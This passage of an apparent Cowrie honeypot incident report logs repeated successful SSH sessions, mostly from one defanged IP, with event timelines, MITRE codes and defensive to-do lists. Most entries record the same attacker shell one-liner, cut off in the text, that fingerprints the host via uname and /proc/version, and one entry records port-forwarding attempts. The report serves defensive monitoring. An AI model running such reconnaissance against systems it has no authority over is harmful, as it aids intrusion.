| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:01:56` | `cowrie.session.connect` |
| `2026-09-06 06:01:56` | `cowrie.client.version` |
| `2026-09-06 06:01:56` | `cowrie.client.kex` |
| `2026-09-06 06:01:58` | `cowrie.login.success` |
| `2026-09-06 06:01:59` | `cowrie.session.params` |
| `2026-09-06 06:01:59` | `cowrie.command.input` |
| `2026-09-06 06:02:00` | `cowrie.log.closed` |
| `2026-09-06 06:02:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a668443ac62

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:03 |
| **Last Seen** | 2026-09-06 06:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:03:39` | `cowrie.session.connect` |
| `2026-09-06 06:03:39` | `cowrie.client.version` |
| `2026-09-06 06:03:39` | `cowrie.client.kex` |
| `2026-09-06 06:03:42` | `cowrie.login.success` |
| `2026-09-06 06:03:44` | `cowrie.session.params` |
| `2026-09-06 06:03:44` | `cowrie.command.input` |
| `2026-09-06 06:03:44` | `cowrie.log.closed` |
| `2026-09-06 06:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56a68ca3f6b9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:05 |
| **Last Seen** | 2026-09-06 06:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:05:20` | `cowrie.session.connect` |
| `2026-09-06 06:05:20` | `cowrie.client.version` |
| `2026-09-06 06:05:20` | `cowrie.client.kex` |
| `2026-09-06 06:05:22` | `cowrie.login.success` |
| `2026-09-06 06:05:24` | `cowrie.session.params` |
| `2026-09-06 06:05:24` | `cowrie.command.input` |
| `2026-09-06 06:05:24` | `cowrie.log.closed` |
| `2026-09-06 06:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3aa843a6e41

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:07 |
| **Last Seen** | 2026-09-06 06:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:07:02` | `cowrie.session.connect` |
| `2026-09-06 06:07:04` | `cowrie.client.version` |
| `2026-09-06 06:07:04` | `cowrie.client.kex` |
| `2026-09-06 06:07:05` | `cowrie.login.success` |
| `2026-09-06 06:07:07` | `cowrie.session.params` |
| `2026-09-06 06:07:07` | `cowrie.command.input` |
| `2026-09-06 06:07:08` | `cowrie.log.closed` |
| `2026-09-06 06:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24ab1305d679

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-06 06:07 |
| **Last Seen** | 2026-09-06 06:07 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:07:19` | `cowrie.session.connect` |
| `2026-09-06 06:07:19` | `cowrie.client.version` |
| `2026-09-06 06:07:19` | `cowrie.client.kex` |
| `2026-09-06 06:07:19` | `cowrie.login.success` |
| `2026-09-06 06:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7800a61f62c8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:08 |
| **Last Seen** | 2026-09-06 06:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:08:43` | `cowrie.session.connect` |
| `2026-09-06 06:08:43` | `cowrie.client.version` |
| `2026-09-06 06:08:43` | `cowrie.client.kex` |
| `2026-09-06 06:08:45` | `cowrie.login.success` |
| `2026-09-06 06:08:46` | `cowrie.session.params` |
| `2026-09-06 06:08:46` | `cowrie.command.input` |
| `2026-09-06 06:08:47` | `cowrie.log.closed` |
| `2026-09-06 06:08:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdf3b3bf9a72

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-06 06:09 |
| **Last Seen** | 2026-09-06 06:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:09:32` | `cowrie.session.connect` |
| `2026-09-06 06:09:32` | `cowrie.client.version` |
| `2026-09-06 06:09:33` | `cowrie.client.kex` |
| `2026-09-06 06:09:33` | `cowrie.login.success` |
| `2026-09-06 06:09:34` | `cowrie.direct-tcpip.request` |
| `2026-09-06 06:09:36` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 06:09:36` | `cowrie.direct-tcpip.data` |
| `2026-09-06 06:09:37` | `cowrie.direct-tcpip.request` |
| `2026-09-06 06:09:38` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 06:09:38` | `cowrie.direct-tcpip.data` |
| `2026-09-06 06:09:38` | `cowrie.direct-tcpip.request` |
| `2026-09-06 06:09:38` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 06:09:38` | `cowrie.direct-tcpip.data` |
| `2026-09-06 06:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e1bf31b78a8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:10 |
| **Last Seen** | 2026-09-06 06:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:10:24` | `cowrie.session.connect` |
| `2026-09-06 06:10:25` | `cowrie.client.version` |
| `2026-09-06 06:10:25` | `cowrie.client.kex` |
| `2026-09-06 06:10:27` | `cowrie.login.success` |
| `2026-09-06 06:10:28` | `cowrie.session.params` |
| `2026-09-06 06:10:28` | `cowrie.command.input` |
| `2026-09-06 06:10:29` | `cowrie.log.closed` |
| `2026-09-06 06:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53782cd3006a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:12 |
| **Last Seen** | 2026-09-06 06:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:12:05` | `cowrie.session.connect` |
| `2026-09-06 06:12:06` | `cowrie.client.version` |
| `2026-09-06 06:12:06` | `cowrie.client.kex` |
| `2026-09-06 06:12:08` | `cowrie.login.success` |
| `2026-09-06 06:12:09` | `cowrie.session.params` |
| `2026-09-06 06:12:09` | `cowrie.command.input` |
| `2026-09-06 06:12:10` | `cowrie.log.closed` |
| `2026-09-06 06:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e208226e9634

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:13 |
| **Last Seen** | 2026-09-06 06:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:13:48` | `cowrie.session.connect` |
| `2026-09-06 06:13:48` | `cowrie.client.version` |
| `2026-09-06 06:13:48` | `cowrie.client.kex` |
| `2026-09-06 06:13:50` | `cowrie.login.success` |
| `2026-09-06 06:13:51` | `cowrie.session.params` |
| `2026-09-06 06:13:51` | `cowrie.command.input` |
| `2026-09-06 06:13:52` | `cowrie.log.closed` |
| `2026-09-06 06:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb2a34544506

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:15 |
| **Last Seen** | 2026-09-06 06:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:15:30` | `cowrie.session.connect` |
| `2026-09-06 06:15:31` | `cowrie.client.version` |
| `2026-09-06 06:15:31` | `cowrie.client.kex` |
| `2026-09-06 06:15:32` | `cowrie.login.success` |
| `2026-09-06 06:15:34` | `cowrie.session.params` |
| `2026-09-06 06:15:34` | `cowrie.command.input` |
| `2026-09-06 06:15:34` | `cowrie.log.closed` |
| `2026-09-06 06:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b6ac5345267

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:17 |
| **Last Seen** | 2026-09-06 06:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:17:14` | `cowrie.session.connect` |
| `2026-09-06 06:17:15` | `cowrie.client.version` |
| `2026-09-06 06:17:15` | `cowrie.client.kex` |
| `2026-09-06 06:17:17` | `cowrie.login.success` |
| `2026-09-06 06:17:18` | `cowrie.session.params` |
| `2026-09-06 06:17:18` | `cowrie.command.input` |
| `2026-09-06 06:17:19` | `cowrie.log.closed` |
| `2026-09-06 06:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78c30e7e8074

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:18 |
| **Last Seen** | 2026-09-06 06:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:18:57` | `cowrie.session.connect` |
| `2026-09-06 06:18:57` | `cowrie.client.version` |
| `2026-09-06 06:18:57` | `cowrie.client.kex` |
| `2026-09-06 06:18:59` | `cowrie.login.success` |
| `2026-09-06 06:19:01` | `cowrie.session.params` |
| `2026-09-06 06:19:01` | `cowrie.command.input` |
| `2026-09-06 06:19:01` | `cowrie.log.closed` |
| `2026-09-06 06:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afd1f4e5e3ac

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:20 |
| **Last Seen** | 2026-09-06 06:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:20:40` | `cowrie.session.connect` |
| `2026-09-06 06:20:40` | `cowrie.client.version` |
| `2026-09-06 06:20:41` | `cowrie.client.kex` |
| `2026-09-06 06:20:43` | `cowrie.login.success` |
| `2026-09-06 06:20:45` | `cowrie.session.params` |
| `2026-09-06 06:20:45` | `cowrie.command.input` |
| `2026-09-06 06:20:45` | `cowrie.log.closed` |
| `2026-09-06 06:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-701a92907491

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:22 |
| **Last Seen** | 2026-09-06 06:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:22:19` | `cowrie.session.connect` |
| `2026-09-06 06:22:19` | `cowrie.client.version` |
| `2026-09-06 06:22:19` | `cowrie.client.kex` |
| `2026-09-06 06:22:22` | `cowrie.login.success` |
| `2026-09-06 06:22:23` | `cowrie.session.params` |
| `2026-09-06 06:22:23` | `cowrie.command.input` |
| `2026-09-06 06:22:24` | `cowrie.log.closed` |
| `2026-09-06 06:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd17d2244bd9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:24 |
| **Last Seen** | 2026-09-06 06:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:24:00` | `cowrie.session.connect` |
| `2026-09-06 06:24:00` | `cowrie.client.version` |
| `2026-09-06 06:24:00` | `cowrie.client.kex` |
| `2026-09-06 06:24:02` | `cowrie.login.success` |
| `2026-09-06 06:24:04` | `cowrie.session.params` |
| `2026-09-06 06:24:04` | `cowrie.command.input` |
| `2026-09-06 06:24:05` | `cowrie.log.closed` |
| `2026-09-06 06:24:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-775b48519487

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:25 |
| **Last Seen** | 2026-09-06 06:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:25:40` | `cowrie.session.connect` |
| `2026-09-06 06:25:41` | `cowrie.client.version` |
| `2026-09-06 06:25:41` | `cowrie.client.kex` |
| `2026-09-06 06:25:43` | `cowrie.login.success` |
| `2026-09-06 06:25:44` | `cowrie.session.params` |
| `2026-09-06 06:25:44` | `cowrie.command.input` |
| `2026-09-06 06:25:45` | `cowrie.log.closed` |
| `2026-09-06 06:25:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dcec1676e2d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:27 |
| **Last Seen** | 2026-09-06 06:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
